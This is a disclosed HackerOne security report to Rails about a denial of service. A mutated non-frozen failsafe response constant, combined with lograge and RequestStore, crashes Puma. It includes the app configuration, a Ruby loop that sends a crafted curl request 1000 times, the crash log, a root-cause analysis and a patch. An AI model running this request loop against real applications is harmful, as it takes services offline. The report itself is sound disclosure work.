# Possible DOS in app with crashing `exceptions_app`

## Report Details
- **Report ID**: 1300802
- **URL**: https://hackerone.com/reports/1300802
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2021-08-11T19:49:56.339Z
- **Disclosed**: 2023-06-28T00:42:04.824Z

## Reporter
- **Username**: ghiculescu
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: rails

## Vulnerability Information
Make a new Rails app, add the `lograge` gem.

```ruby
# config/application.rb
config.exceptions_app = self.routes
config.lograge.enabled = true
```

```ruby
# config/routes.rb

Rails.application.routes.draw do
  root to: "site#index"

  get 'errors/not_found'
  match "/404", to: "errors#not_found", via: :all
end
```

```ruby
# app/controllers/errors_controller.rb

class ErrorsController < ApplicationController
  def not_found
    render status: 404 # the view can do whatever, it doesn't matter
  end
end
```

Start the server as a production app (eg. it would start on Heroku): `RAILS_ENV=production RACK_ENV=production SECRET_KEY_BASE=foo RAILS_SERVE_STATIC_FILES=enabled RAILS_MAX_THREADS=2 RAILS_LOG_TO_STDOUT=enabled rails s`

Run this script:

```ruby
1000.times.each do |n|
  `curl -H "Accept: application/xml" -H "Content-Type: application/xml" -X GET http://localhost:3000///wp1/wp-includes/wlwmanifest.xml`
end
```

At some point (after 989 requests for me), Puma will crash:

```
2021-08-11 13:23:04 -0500 Rack app ("GET ///wp1/wp-includes/wlwmanifest.xml" - (127.0.0.1)): #<fatal: machine stack overflow in critical region>
```

Since it's a fatal Ruby error (which is unrecoverable) this leaves Puma in a zombie state, similar to https://github.com/puma/puma/issues/2552

The reason this crashes is:

- [ActionDispatch::ShowExceptions](https://github.com/rails/rails/blob/main/actionpack/lib/action_dispatch/middleware/show_exceptions.rb#L55) returns a non-frozen const.
- [lograge](https://github.com/roidrage/lograge/blob/master/lib/lograge/rails_ext/rack/logger.rb#L15) doesn't wrap this response in a `Rack::BodyProxy`. If you weren't using lograge, then Rails would do so [here](https://github.com/rails/rails/blob/main/railties/lib/rails/rack/logger.rb#L37). Before realising this could be a Rails security vulnerability, I made a PR for this here: https://github.com/roidrage/lograge/pull/333
- [RequestStore](https://github.com/steveklabnik/request_store/blob/master/lib/request_store/middleware.rb#L21) mutates the response body. This causes the const in Rails to get mutated, it now is a `Rack::BodyProxy` with a reference to itself. Every time it gets returned, it gets mutated again and the object gets one layer bigger.  Before realising this could be a Rails security vulnerability, I made a PR for the mutation here: https://github.com/steveklabnik/request_store/pull/78
- Eventually, we have an extremely large `Rack::BodyProxy` that references itself hundreds of times in memory. This is easy to make crash. In our case, [Rack::Sendfile](https://github.com/rack/rack/blob/master/lib/rack/sendfile.rb#L113) causes a `SystemStackError`, I think this happens because of how `BodyProxy` handles `respond_to_missing?`.

I don't think this issue is unique to `lograge` + `RequestStore`. It can happen anywhere you have:

- A middleware that mutates a response, and
- `FAILSAFE_RESPONSE` (or another non-frozen const) being passed to that middleware, and
- Something higher in the middleware stack that calls a missing method on the response.

I was about to make a PR to Rails with this patch when it dawned on me that this could be a security issue:

```diff
diff --git a/actionpack/lib/action_dispatch/middleware/show_exceptions.rb b/actionpack/lib/action_dispatch/middleware/show_exceptions.rb
index 0a7e895e59..d207765acc 100644
--- a/actionpack/lib/action_dispatch/middleware/show_exceptions.rb
+++ b/actionpack/lib/action_dispatch/middleware/show_exceptions.rb
@@ -14,13 +14,14 @@ module ActionDispatch
   # If the application returns a "X-Cascade" pass response, this middleware
   # will send an empty response as result with the correct status code.
   # If any exception happens inside the exceptions app, this middleware
-  # catches the exceptions and returns a FAILSAFE_RESPONSE.
+  # catches the exceptions and returns a failsafe response.
   class ShowExceptions
     FAILSAFE_RESPONSE = [500, { "Content-Type" => "text/plain" },
       ["500 Internal Server Error\n" \
        "If you are the administrator of this website, then please read this web " \
        "application's log file and/or the web server's log file to find out what " \
        "went wrong."]]
+    deprecate_constant :FAILSAFE_RESPONSE

     def initialize(app, exceptions_app)
       @app = app
@@ -52,7 +53,15 @@ def render_exception(request, exception)
         response[1]["X-Cascade"] == "pass" ? pass_response(status) : response
       rescue Exception => failsafe_error
         $stderr.puts "Error during failsafe response: #{failsafe_error}\n  #{failsafe_error.backtrace * "\n  "}"
-        FAILSAFE_RESPONSE
+        failsafe_response
+      end
+
+      def failsafe_response
+        [500, { "Content-Type" => "text/plain" },
+          ["500 Internal Server Error\n" \
+         "If you are the administrator of this website, then please read this web " \
+         "application's log file and/or the web server's log file to find out what " \
+         "went wrong."]]
       end

       def pass_response(status)
```

## Impact

If you find an app that's configured as above you could bring it offline by making the same bad request enough times.

## Attachments
No attachments
